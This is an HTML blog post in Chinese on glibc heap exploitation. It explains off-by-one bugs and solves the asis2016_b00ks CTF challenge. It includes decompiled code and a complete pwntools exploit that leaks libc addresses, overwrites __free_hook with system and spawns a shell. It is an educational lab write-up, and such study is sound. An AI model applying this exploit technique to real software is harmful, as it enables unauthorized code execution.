@@ -1,0 +1,617 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="各种堆题的知识点和例题总结">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>pwn学习之堆利用 - Zino&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"zino00.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"f45dcd001d67e8f9d84f91248ea31abf","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Zino's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="pwn学习之堆利用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-09-25 08:38" pubdate>
+        2023年9月25日 早上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      32
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pwn学习之堆利用</h1>
+            
+            <div class="markdown-body">
+              <h1 id="堆数据结构"><a class="markdownIt-Anchor" href="#堆数据结构"></a> 堆数据结构</h1>
+<h2 id="堆中的-off-by-one"><a class="markdownIt-Anchor" href="#堆中的-off-by-one"></a> 堆中的 Off-By-One</h2>
+<h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3>
+<p>off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p>
+<p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<h3 id="off-by-one-利用思路"><a class="markdownIt-Anchor" href="#off-by-one-利用思路"></a> off-by-one 利用思路</h3>
+<ol>
+<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
+<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
+</ol>
+<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
+<blockquote>
+<p>平台：buuctf</p>
+<p>题目：asis2016_b00ks</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#asis2016_b00ks">https://buuoj.cn/challenges#asis2016_b00ks</a></p>
+</blockquote>
+<h4 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析"></a> 题目分析</h4>
+<p>题目是一个常见的选单式程序，功能是一个图书管理系统。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> Create a book<br><span class="hljs-bullet">2.</span> Delete a book<br><span class="hljs-bullet">3.</span> Edit a book<br><span class="hljs-bullet">4.</span> Print book detail<br><span class="hljs-bullet">5.</span> Change current author name<br><span class="hljs-bullet">6.</span> Exit<br></code></pre></div></td></tr></table></figure>
+<p>程序提供了创建、删除、编辑、打印图书的功能。题目是 64 位程序，保护如下所示。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Canary                        :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">NX                            :</span> <span class="hljs-literal">Yes</span><br><span class="hljs-attr">PIE                           :</span> <span class="hljs-literal">Yes</span><br><span class="hljs-attr">Fortify                       :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">RelRO                         :</span> <span class="hljs-string">Full</span><br></code></pre></div></td></tr></table></figure>
+<p>程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">char</span> *description;<br>    <span class="hljs-keyword">int</span> size;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>book 结构中存在 name 和 description ， name 和 description 在堆上分配。首先分配 name buffer ，使用 malloc ，大小自定但小于 32 。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;size);<br>__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;size);<br>ptr = <span class="hljs-built_in">malloc</span>(size);<br></code></pre></div></td></tr></table></figure>
+<p>之后分配 description ，同样大小自定但无限制。</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter book description size: &quot;</span>, *(_QWORD *)&amp;size);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);<br><br>v5 = <span class="hljs-built_in">malloc</span>(size);<br></code></pre></div></td></tr></table></figure>
+<p>之后分配 book 结构的内存</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">book = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<br><span class="hljs-keyword">if</span> ( book )<br>&#123;<br>    *((_DWORD *)book + <span class="hljs-number">6</span>) = size;<br>    *((_QWORD *)off_202010 + v2) = book;<br>    *((_QWORD *)book + <span class="hljs-number">2</span>) = description;<br>    *((_QWORD *)book + <span class="hljs-number">1</span>) = name;<br>    *(_DWORD *)book = ++unk_202024;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<h4 id="漏洞"><a class="markdownIt-Anchor" href="#漏洞"></a> 漏洞</h4>
+<p>程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。存在off_by_one漏洞</p>
+<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 __fastcall <span class="hljs-title">my_read</span><span class="hljs-params">(_BYTE *ptr, <span class="hljs-keyword">int</span> number)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  _BYTE *buf; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( number &lt;= <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  buf = ptr;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>) != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>    <span class="hljs-keyword">if</span> ( *buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    ++buf;<br>    <span class="hljs-keyword">if</span> ( i == number )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *buf = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>而观察author_name和book的地址偏差可知，book就放在name之后，相差0x20，所以off_by_one后就可以泄露出book1的地址</p>
+<p><img src="/posts/4e6f3d50/image-20230927111024536.png" srcset="/img/loading.gif" lazyload alt="image-20230927111024536"></p>
+<p><img src="/posts/4e6f3d50/image-20230927111147515-16957843087501.png" srcset="/img/loading.gif" lazyload alt="image-20230927111147515"></p>
+<p><img src="/posts/4e6f3d50/image-20230927111153683.png" srcset="/img/loading.gif" lazyload alt="image-20230927111153683"></p>
+<h4 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h4>
+<p>首先修改一下glibc版本</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">patchelf</span> --set-interpreter /path/to/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu<span class="hljs-number">11</span>.<span class="hljs-number">3</span>_amd<span class="hljs-number">64</span>/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so --set-rpath  /patch/to/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu<span class="hljs-number">11</span>.<span class="hljs-number">3</span>_amd<span class="hljs-number">64</span>/ ./b<span class="hljs-number">00</span>ks<br></code></pre></div></td></tr></table></figure>
+<ol>
+<li>首先第一步创建两个book，其中第二个book通过mmap分配</li>
+<li>通过print打印出两个堆的地址</li>
+</ol>
+<p><img src="/posts/4e6f3d50/image-20230927111909779.png" srcset="/img/loading.gif" lazyload alt="image-20230927111909779"></p>
+<p><img src="/posts/4e6f3d50/image-20230927112035864.png" srcset="/img/loading.gif" lazyload alt="image-20230927112035864"></p>
+<ol start="3">
+<li>
+<p>edit第一个堆块的description来伪造一个fake book且让这个fake book指向book2<img src="/posts/4e6f3d50/image-20230927112416622.png" srcset="/img/loading.gif" lazyload alt="image-20230927112416622"></p>
+</li>
+<li>
+<p>通过修改author name来溢出一个空字节，使book1使其指向那个fake book</p>
+</li>
+</ol>
+<p><img src="/posts/4e6f3d50/image-20230927112628769.png" srcset="/img/loading.gif" lazyload alt="image-20230927112628769"></p>
+<ol start="5">
+<li>再次打印可以得到堆的name ptr得到libc偏移地址</li>
+</ol>
+<p><img src="/posts/4e6f3d50/image-20230927112752623.png" srcset="/img/loading.gif" lazyload alt="image-20230927112752623"></p>
+<p><img src="/posts/4e6f3d50/image-20230927112911277.png" srcset="/img/loading.gif" lazyload alt="image-20230927112911277"></p>
+<ol start="6">
+<li>然后修改fake book使其des ptr变成free_hook ptr,并再次修改book2将free_hook ptr指向system,再次修改book1的des也就是book2的des ptr为/bin/sh</li>
+</ol>
+<p><img src="/posts/4e6f3d50/image-20230927112932695.png" srcset="/img/loading.gif" lazyload alt="image-20230927112932695"></p>
+<ol start="7">
+<li>然后删除book2，过程中会执行free_hook中的system,参数为/bin/sh,即可获取到shell</li>
+</ol>
+<p><img src="/posts/4e6f3d50/image-20230927113513591.png" srcset="/img/loading.gif" lazyload alt="image-20230927113513591"></p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./b00ks&#x27;</span>)<br><span class="hljs-comment">#p =remote(&quot;node4.buuoj.cn&quot;,26924)</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>libc = ELF(<span class="hljs-string">&#x27;/home/zino/workspace/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./b00ks&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span>(<span class="hljs-params">size,name,dsize,desc</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Enter book name size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter book name (Max 32 chars): &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(name))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter book description size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(dsize))<br>	p.recvuntil(<span class="hljs-string">&quot;Enter book description: &quot;</span>)<br>	p.sendline(desc)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Enter the book id you want to delete: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,des</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Enter the book id you want to edit: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>,des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_book</span>():</span><br>	p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">name</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>,name)<br><br>gdb.attach(p)<br>sleep(<span class="hljs-number">3</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x20</span>)<span class="hljs-comment">#author_name   </span><br><span class="hljs-comment"># author_name: 0x55******2040</span><br><span class="hljs-comment"># book_chunk_address: 0x0x55******2060</span><br><span class="hljs-comment">#创建第一个book，这里name和describe的长度需要调试确认一下，最好使得book的地址以0x30结尾</span><br><span class="hljs-comment"># 这样后续offbyone后恰好变为0x00,这和des的地址恰好是一样的，否则就要填充偏移一下</span><br><span class="hljs-comment"># 也就是说，在第二次offbyone后，book1的堆地址会指向des所在的内存地址，而这里的des是我们可以读写的</span><br><br>create(<span class="hljs-number">0xd0</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&quot;bbbb&quot;</span>)<span class="hljs-comment">#book1</span><br><span class="hljs-comment"># 创建一个很大的book，这样会使用mmap来分配内存，而mmap分配的内存地址和libc的偏移是固定的</span><br>create(<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;dddd&quot;</span>)<span class="hljs-comment">#book2</span><br><br><span class="hljs-comment">#泄露出book1的地址</span><br>print_book()<br>p.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x20</span>)<br>book1_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;book1_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(book1_addr))<span class="hljs-comment">#0x55fdfce5e130</span><br><span class="hljs-comment">#这里的偏移由ida逆向可知，总是相差0x30</span><br>book2_addr = book1_addr + <span class="hljs-number">0x30</span>;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;book2_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(book2_addr))<span class="hljs-comment">#0x55fdfce5e160</span><br><span class="hljs-comment">#构造一个fake_book,写入book1的des中</span><br><span class="hljs-comment">#这个book的name等于book2结构体中存储name指针的内存地址，des等于book2的des指针地址</span><br>fake_book = p64(<span class="hljs-number">1</span>) + p64(book2_addr + <span class="hljs-number">0x8</span>) +p64(book2_addr + <span class="hljs-number">0x10</span>) +p64(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">1</span>,fake_book)<br><br><span class="hljs-comment"># 这时再次offbyone,这之后book1的堆地址被溢出成了des的地址</span><br><span class="hljs-comment"># 也就是说，后面对book1的操作等价于我们在des中fake的那个book的操作</span><br>change(<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#打印出book2的name指针地址</span><br>print_book()<br><br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br><br>leak_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak_addr&quot;</span>,<span class="hljs-built_in">hex</span>(leak_addr)) <br><span class="hljs-comment">#0x5c1010由调试时的lead_addr地址和vmmap出来的libc基地址求差得来</span><br><span class="hljs-comment"># 因为差值一定，后续我们就可以根据这个差值来求得libc_base</span><br>libc_base = leak_addr- <span class="hljs-number">0x5CA010</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] + libc_base<br>sh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) + libc_base<br>free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] + libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system_addr&quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sh_addr&quot;</span>,<span class="hljs-built_in">hex</span>(sh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><br><span class="hljs-comment"># 因为book1其实相当于fake_book,所以就是修改book2中的des指针</span><br><span class="hljs-comment"># 使其不指向原先存储des内容的内存，而是执行free_hook指针</span><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br><span class="hljs-comment">#这时候修改book2的des其实就是修改free_hook里的内容</span><br>edit(<span class="hljs-number">2</span>, p64(system_addr))<br><span class="hljs-comment"># 再次修改book2中的des指针，使其变成/bin/sh</span><br><span class="hljs-comment"># 因为后面free的时候会将这个指针作为参数传入</span><br><span class="hljs-comment"># 这样修改后，其实就是相对于传入了/bin/sh作为system的参数</span><br>edit(<span class="hljs-number">1</span>, p64(sh_addr))<br><span class="hljs-comment"># free的时候进入__free_hook，发现其不为空，于是执行__free_hook中的system函数，同时参数为&quot;/bin/sh&quot;</span><br>delete(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#成功获取shell</span><br>p.interactive()<br></code></pre></div></td></tr></table></figure>
+<p>one_gadget版本</p>
+<p>免于计算system和binsh地址</p>
+<p><img src="/posts/4e6f3d50/image-20230927113633843.png" srcset="/img/loading.gif" lazyload alt="image-20230927113633843"></p>
